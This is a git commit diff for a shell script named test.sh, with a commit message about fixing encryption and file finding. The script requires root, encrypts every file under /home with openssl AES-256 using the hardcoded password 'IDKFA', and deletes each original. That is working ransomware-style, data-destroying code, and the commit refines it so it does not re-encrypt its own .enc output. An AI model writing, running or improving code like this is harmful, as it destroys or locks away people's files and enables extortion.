97a4ee3ece747a22ab32e6508ee1f69a098c1ef7
Anas Hansson <anashansson@gmail.com>
2017-05-14 05:59:56 +0200

    fix encrtption and file finder

--- test.sh
+++ test.sh
@@ -3,9 +3,9 @@ if [[ $(id -u) -ne 0 ]] ; then echo "Please run as root" ; exit 1 ; fi
 
 cd /home;
 
-for f in $(find /home); do
+for f in $(find /home -not -name "*.enc"); do
 	if [ -f $f ]; then
-		sudo openssl enc -aes-256-cbc -salt -in "$f" -out "${f%.*}".enc -k "IDKFA";
+		sudo openssl enc -aes-256-cbc -salt -in "$f" -out "$f".enc -k "IDKFA";
 		echo -e "File: [$f] encrypted";
 		sudo rm -f "$f";
 	fi
